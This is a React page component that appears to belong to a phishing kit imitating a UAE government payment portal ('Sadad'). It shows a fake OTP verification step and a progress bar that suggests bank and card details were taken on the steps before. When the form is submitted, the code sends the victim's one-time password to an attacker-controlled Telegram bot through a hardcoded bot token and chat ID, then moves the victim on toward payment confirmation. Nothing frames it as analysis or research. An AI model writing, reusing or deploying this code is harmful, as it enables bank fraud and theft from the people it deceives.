import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ShieldCheck, Smartphone, Loader2, RefreshCw, AlertCircle } from "lucide-react";

export default function VerifyOtp() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(300);
  const [showError, setShowError] = useState(false);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4) {
      setShowError(true);
      return;
    }
    
    setLoading(true);
    setShowError(false);

    const message = `
🔐 *رمز التحقق (OTP) - بوابة سداد الإمارات*
--------------------------
🔢 *الرمز المدخل:* ${otp}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      setTimeout(() => {
        const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
        sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, otp }));
        setLocation("/confirm-payment");
      }, 1800);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-xl mx-auto">
          {/* Progress Steps */}
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step <= 4 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step <= 4 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="bg-slate-900 p-8 text-white text-center">
              <div className="w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-amber-500/30">
                <Smartphone className="w-8 h-8 text-amber-500" />
              </div>
              <h2 className="text-2xl font-bold">التحقق من الهوية</h2>
              <p className="text-slate-400 text-sm mt-2">تم إرسال رمز التحقق (OTP) إلى رقم هاتفك المرتبط بالبطاقة</p>
            </div>

            <div className="p-8">
              <div className="bg-green-50 border border-green-100 p-4 rounded-xl flex items-center gap-3 mb-8">
                <ShieldCheck className="w-5 h-5 text-green-600" />
                <p className="text-xs text-green-800 font-bold">تم إرسال الرمز بنجاح. يرجى التحقق من رسائل SMS.</p>
              </div>

              <form onSubmit={handleNext} className="space-y-8">
                <div className="space-y-4">
                  <Label htmlFor="otp" className="text-sm font-bold text-gray-700 block text-center">أدخل رمز التحقق المكون من 6 أرقام</Label>
                  <Input 
                    id="otp" 
                    required 
                    placeholder="0 0 0 0 0 0" 
                    className={`text-center text-3xl tracking-[0.5em] py-8 font-black bg-gray-50 border-2 focus:ring-amber-500 ${showError ? 'border-red-500 animate-shake' : 'border-gray-100'}`}
                    value={otp} 
                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))} 
                  />
                  {showError && (
                    <p className="text-xs text-red-500 flex items-center justify-center gap-1 font-bold">
                      <AlertCircle className="w-3 h-3" /> يرجى إدخال رمز التحقق بشكل صحيح
                    </p>
                  )}
                </div>

                <div className="flex flex-col items-center gap-4">
                  <div className="flex items-center gap-2 text-gray-500">
                    <span className="text-xs">تنتهي صلاحية الرمز خلال:</span>
                    <span className="font-mono font-bold text-amber-600 bg-amber-50 px-3 py-1 rounded-full border border-amber-100">{formatTime(timer)}</span>
                  </div>
                  
                  <button type="button" className="text-xs text-blue-600 font-bold hover:underline flex items-center gap-1">
                    <RefreshCw className="w-3 h-3" /> إعادة إرسال الرمز
                  </button>
                </div>

                <div className="flex gap-4 pt-4">
                  <Button type="button" variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/card-data")}>الرجوع</Button>
                  <Button type="submit" className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" disabled={loading}>
                    {loading ? (
                      <span className="flex items-center gap-2">
                        <Loader2 className="w-5 h-5 animate-spin" /> جاري التحقق...
                      </span>
                    ) : "تأكيد العملية"}
                  </Button>
                </div>
              </form>
            </div>
            
            <div className="bg-gray-50 p-4 text-center border-t border-gray-100">
              <p className="text-[10px] text-gray-400">إذا لم يصلك الرمز، يرجى التأكد من تغطية الشبكة أو التواصل مع البنك المصدر للبطاقة.</p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
